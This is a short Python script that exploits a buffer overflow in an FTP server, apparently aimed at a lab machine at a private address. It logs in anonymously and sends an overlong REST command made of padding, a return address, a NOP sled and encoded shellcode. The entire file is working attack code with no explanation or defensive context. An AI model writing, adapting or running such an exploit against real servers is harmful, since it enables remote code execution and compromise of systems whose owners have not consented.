#!/usr/bin/python

import socket
import sys
#evil= "A" * 247 + "B" * 4 + "C" * 400
shellcode = ("\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7d\xbe"
"\x87\x8c\x83\xeb\xfc\xe2\xf4\x81\x56\x05\x8c\x7d\xbe\xe7\x05"
"\x98\x8f\x47\xe8\xf6\xee\xb7\x07\x2f\xb2\x0c\xde\x69\x35\xf5"
"\xa4\x72\x09\xcd\xaa\x4c\x41\x2b\xb0\x1c\xc2\x85\xa0\x5d\x7f"
"\x48\x81\x7c\x79\x65\x7e\x2f\xe9\x0c\xde\x6d\x35\xcd\xb0\xf6"
"\xf2\x96\xf4\x9e\xf6\x86\x5d\x2c\x35\xde\xac\x7c\x6d\x0c\xc5"
"\x65\x5d\xbd\xc5\xf6\x8a\x0c\x8d\xab\x8f\x78\x20\xbc\x71\x8a"
"\x8d\xba\x86\x67\xf9\x8b\xbd\xfa\x74\x46\xc3\xa3\xf9\x99\xe6"
"\x0c\xd4\x59\xbf\x54\xea\xf6\xb2\xcc\x07\x25\xa2\x86\x5f\xf6"
"\xba\x0c\x8d\xad\x37\xc3\xa8\x59\xe5\xdc\xed\x24\xe4\xd6\x73"
"\x9d\xe1\xd8\xd6\xf6\xac\x6c\x01\x20\xd6\xb4\xbe\x7d\xbe\xef"
"\xfb\x0e\x8c\xd8\xd8\x15\xf2\xf0\xaa\x7a\x41\x52\x34\xed\xbf"
"\x87\x8c\x54\x7a\xd3\xdc\x15\x97\x07\xe7\x7d\x41\x52\xdc\x2d"
"\xee\xd7\xcc\x2d\xfe\xd7\xe4\x97\xb1\x58\x6c\x82\x6b\x10\xe6"
"\x78\xd6\x47\x24\x45\xd8\xef\x8e\x7d\xaf\xd6\x05\x9b\xd4\x97"
"\xda\x2a\xd6\x1e\x29\x09\xdf\x78\x59\xf8\x7e\xf3\x80\x82\xf0"
"\x8f\xf9\x91\xd6\x77\x39\xdf\xe8\x78\x59\x15\xdd\xea\xe8\x7d"
"\x37\x64\xdb\x2a\xe9\xb6\x7a\x17\xac\xde\xda\x9f\x43\xe1\x4b"
"\x39\x9a\xbb\x8d\x7c\x33\xc3\xa8\x6d\x78\x87\xc8\x29\xee\xd1"
"\xda\x2b\xf8\xd1\xc2\x2b\xe8\xd4\xda\x15\xc7\x4b\xb3\xfb\x41"
"\x52\x05\x9d\xf0\xd1\xca\x82\x8e\xef\x84\xfa\xa3\xe7\x73\xa8"
"\x05\x77\x39\xdf\xe8\xef\x2a\xe8\x03\x1a\x73\xa8\x82\x81\xf0"
"\x77\x3e\x7c\x6c\x08\xbb\x3c\xcb\x6e\xcc\xe8\xe6\x7d\xed\x78"
"\x59")
evil = "A" * 247 + "\xd7\x30\x9d\x7c" + "\x90" * 15 + shellcode
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',21))
s.send('USER anonymous\r\n');
s.recv(1024)
s.send('PASS anonymous\r\n');
s.recv(1024)
s.send('REST' + evil + '\r\n');
s.recv(1024)
s.send('QUIT\r\n');
s.close

